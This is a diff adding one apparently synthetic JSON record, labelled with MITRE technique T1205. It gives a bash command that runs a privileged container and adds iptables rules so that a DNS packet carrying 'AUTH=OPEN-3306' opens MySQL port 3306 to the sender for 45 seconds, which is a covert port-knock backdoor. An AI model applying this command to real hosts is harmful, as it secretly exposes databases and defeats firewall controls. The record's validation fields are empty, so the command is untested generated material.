@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p udp --dport 53 -m string --string 'AUTH=OPEN-3306' --algo bm -j LOG --log-prefix 'T1205_DNS_SIG ' --log-level 4 && iptables -I INPUT -p udp --dport 53 -m string --string 'AUTH=OPEN-3306' --algo bm -m recent --name t1205_dns --set && iptables -I INPUT -p tcp --dport 3306 -m recent --name t1205_dns --rcheck --seconds 45 --reap -j ACCEPT\"",
+  "explanation": "Uses a DNS TXT-style token in UDP/53 traffic as the signal. Matching packets log and add the sender to a recent list, temporarily enabling MySQL (3306) for that source. This leverages application-specific DNS payloads as signaling.",
+  "rationale_steps": [
+    "Run iptables from Docker on the host network namespace.",
+    "Detect unusual DNS payload string 'AUTH=OPEN-3306' as a covert knock.",
+    "Log signal, then allow 3306 for 45 seconds to the signaled IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-4970f6eb-57ddc505",
+  "source_prompt_hash": "4970f6eb",
+  "timestamp_utc": "2025-09-30T03:38:51.523409Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
